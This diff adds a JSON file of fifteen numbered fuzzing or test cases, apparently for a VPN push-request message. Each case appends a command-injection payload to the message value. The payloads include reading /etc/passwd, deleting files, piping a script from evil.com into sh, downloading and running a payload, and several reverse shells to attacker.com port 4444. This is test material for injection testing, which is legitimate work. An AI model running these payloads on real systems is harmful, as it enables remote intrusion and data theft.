@@ -1,0 +1,47 @@
+{
+  "S1": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;COMMAND_INJECTION;id;whoami", "op": "r", "size": "-"}
+  ],
+  "S2": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST$(whoami)", "op": "r", "size": "-"}
+  ],
+  "S3": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST`id`", "op": "r", "size": "-"}
+  ],
+  "S4": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST|cat /etc/passwd", "op": "r", "size": "-"}
+  ],
+  "S5": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST&&ls -la", "op": "r", "size": "-"}
+  ],
+  "S6": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||ping 127.0.0.1", "op": "r", "size": "-"}
+  ],
+  "S7": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;rm -rf /tmp/test;", "op": "r", "size": "-"}
+  ],
+  "S8": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; curl http://evil.com/shell.sh | sh", "op": "r", "size": "-"}
+  ],
+  "S9": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; nc -e /bin/bash attacker.com 4444", "op": "r", "size": "-"}
+  ],
+  "S10": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'", "op": "r", "size": "-"}
+  ],
+  "S11": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; wget http://attacker.com/payload -O /tmp/payload", "op": "r", "size": "-"}
+  ],
+  "S12": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; chmod +x /tmp/payload; /tmp/payload", "op": "r", "size": "-"}
+  ],
+  "S13": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; export PATH=/tmp:$PATH; my_malicious_tool", "op": "r", "size": "-"}
+  ],
+  "S14": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; (whoami;id;ls)", "op": "r", "size": "-"}
+  ],
+  "S15": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST; /bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1", "op": "r", "size": "-"}
+  ]
+}
